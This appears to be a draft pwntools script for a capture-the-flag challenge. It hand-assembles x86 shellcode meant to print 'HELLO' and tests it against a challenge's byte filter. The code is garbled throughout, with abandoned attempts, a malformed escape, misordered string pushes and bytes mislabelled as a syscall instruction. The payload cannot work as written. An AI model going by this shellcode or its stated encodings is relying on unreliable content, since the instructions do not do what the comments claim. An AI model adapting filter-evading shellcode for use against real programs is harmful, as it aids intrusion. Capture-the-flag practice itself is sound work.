#!/usr/bin/env python3
from pwn import *

base = 0x1337005
sc = b""

syscall1_offset = 60

sc += b"\xb8" + p32(base + syscall1_offset)
sc += b"\x80\x00\x8d\x40\x80\x00\x40"

# write(1, "HELLO\n", 6)
sc += b"\x68\x4c4\x4c\x4f"      # push "OELL" (but we want "HELLO\n")
# Actually, let's push "HELLO\n" properly
sc += b"\x68\x0a\x4f\x4c\x4c"  # push "\nOLL"  
sc += b"\x68\x48\x45\x4c\x4c"  # push "LLEH" -> wait this is backwards

# Start over - "HELLO\n" = 48 45 4c 4c 4f 0a
# Reverse for little-endian pushes
sc = b""
sc += b"\xb8" + p32(base + syscall1_offset)
sc += b"\x80\x00\x8d\x40\x80\x00\x40"

sc += b"\x68\x4f\x0a\x0a\x0a"  # push "O\n\n\n"
sc += b"\x68\x4c\x4c\x45\x48"  # push "HELL"
sc += b"\x89\xe1"               # mov ecx, esp
sc += b"\xb8\x04\x00\x00\x00"  # mov eax, 4 (write)
sc += b"\xbb\x01\x00\x00\x00"  # mov ebx, 1 (stdout)
sc += b"\xba\x05\x00\x00\x00"  # mov edx, 5 (length)

curr = len(sc)
sc += b"\xe9" + p32((syscall1_offset - curr - 5) & 0xffffffff)

while len(sc) < syscall1_offset:
    sc += b"\x40\x48"

sc += b"\x40\x40"  # int 0x80

# exit
sc += b"\xb8\x01\x00\x00\x00"
sc += b"\xbb\x00\x00\x00\x00"
sc += asm("int3")  # Just end with breakpoint

print("Test payload:", sc.hex())

import os
r = os.popen(f'echo "{sc.hex()}" | python chal.py 2>&1').read()
if "bad" in r.lower():
    print("FAILED:", r)
else:
    print("PASSED validation")
